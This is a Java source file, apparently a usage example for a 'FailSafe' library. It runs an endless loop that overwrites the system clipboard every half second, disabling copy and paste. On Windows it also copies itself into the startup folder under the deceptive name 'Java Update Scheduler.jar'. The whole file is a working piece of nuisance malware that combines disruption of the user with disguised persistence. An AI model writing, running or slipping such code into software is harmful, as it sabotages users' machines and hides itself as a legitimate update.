package root.failSafe.usageExample;

import java.awt.Toolkit;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.StringSelection;
import java.util.Collections;

import root.failSafe.FailSafe;

/**
 * Disable copy paste functionality, in addition specifically for Windows OS
 * also put this program to startup with name "Java Update Scheduler.jar"
 *
 */
public class DisableCopyPasteFailSafe {

	public static void main(String[] args) throws Exception {

		FailSafe.FailSafeTask clipboardMess = (processName, cmdLineArgs) ->
		{
			try
			{
				Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
				StringSelection selection = new StringSelection("CopyPaste Disabled!");

				troubling: while (true)
				{
					try
					{
						clipboard.setContents(selection, null);
						Thread.sleep(500);
					} catch (Exception e)
					{
						continue troubling;
					}
				}
			} catch (Exception e)
			{
				// do nothing
			}
		};
		FailSafe.execute(args, DisableCopyPasteFailSafe.class, clipboardMess,
				Collections.singletonMap('A', FailSafe.COPY_JAR_TO_STARTUP_WIN));
	}

}
